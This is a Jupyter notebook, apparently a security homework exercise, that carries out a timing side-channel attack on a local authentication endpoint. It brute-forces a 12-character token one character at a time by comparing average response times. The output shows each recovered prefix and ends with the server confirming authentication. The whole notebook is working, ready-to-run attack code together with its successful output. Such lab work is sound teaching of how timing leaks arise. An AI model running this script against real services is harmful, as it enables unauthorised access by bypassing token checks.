{
 "cells": [
  {
   "cell_type": "code",
   "id": "cf2450b0fbf8c3c5",
   "metadata": {
    "ExecuteTime": {
     "end_time": "2024-11-27T14:13:36.451364Z",
     "start_time": "2024-11-27T14:13:36.436315Z"
    }
   },
   "source": [
    "import requests\n",
    "import matplotlib.pyplot as plt\n",
    "\n",
    "url = \"http://localhost:8080/hw10/ex1\"\n",
    "chars = [chr(i) for i in range(97, 123)] + [str(i) for i in range(10)]"
   ],
   "outputs": [],
   "execution_count": 221
  },
  {
   "metadata": {
    "ExecuteTime": {
     "end_time": "2024-11-27T14:13:36.608871Z",
     "start_time": "2024-11-27T14:13:36.602146Z"
    }
   },
   "cell_type": "code",
   "source": [
    "def plot_time(time_dict):\n",
    "    plt.bar(time_dict.keys(), time_dict.values())\n",
    "    plt.title(\"Average time for each character\")\n",
    "    plt.xlabel(\"Character\")\n",
    "    plt.ylabel(\"Time (s)\")\n",
    "    plt.show()"
   ],
   "id": "818a8dc8956e62e7",
   "outputs": [],
   "execution_count": 222
  },
  {
   "metadata": {
    "ExecuteTime": {
     "end_time": "2024-11-27T14:17:44.905423Z",
     "start_time": "2024-11-27T14:13:36.971556Z"
    }
   },
   "cell_type": "code",
   "source": [
    "token = \"\"\n",
    "n = len(token)\n",
    "cur_len = n\n",
    "\n",
    "num_iter = 2\n",
    "\n",
    "for i in range(12 - n):\n",
    "    time_dict = {}\n",
    "    for c in chars:\n",
    "        cur_token = token + c + '0' * (12 - (cur_len + 1))\n",
    "        body = {\"token\": cur_token}\n",
    "        time_iter = 0\n",
    "        for i in range(num_iter):\n",
    "            res = requests.post(url, json=body)\n",
    "            time_iter += res.elapsed.total_seconds()\n",
    "        \n",
    "        time_dict[c] = time_iter/num_iter\n",
    "    \n",
    "    token += list(sorted(time_dict.items(), key=lambda item: item[1], reverse=True))[0][0]\n",
    "    cur_len = len(token)\n",
    "    \n",
    "    print(f\"Token: {token}\")"
   ],
   "id": "b6138958fdd56e13",
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Token: b\n",
      "Token: b4\n",
      "Token: b43\n",
      "Token: b435\n",
      "Token: b4351\n",
      "Token: b4351d\n",
      "Token: b4351d3\n",
      "Token: b4351d39\n",
      "Token: b4351d395\n",
      "Token: b4351d395d\n",
      "Token: b4351d395d2\n",
      "Token: b4351d395d2f\n"
     ]
    }
   ],
   "execution_count": 223
  },
  {
   "metadata": {
    "collapsed": true,
    "ExecuteTime": {
     "end_time": "2024-11-27T14:17:45.530316Z",
     "start_time": "2024-11-27T14:17:44.913393Z"
    }
   },
   "cell_type": "code",
   "source": [
    "body = {\n",
    "    \"token\": token\n",
    "}\n",
    "\n",
    "res = requests.post(url, json=body)\n",
    "\n",
    "print(f\"ret: {res.status_code}, resp: {res.text}\")"
   ],
   "id": "initial_id",
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ret: 200, resp: Welcome, you are now authenticated\n"
     ]
    }
   ],
   "execution_count": 224
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
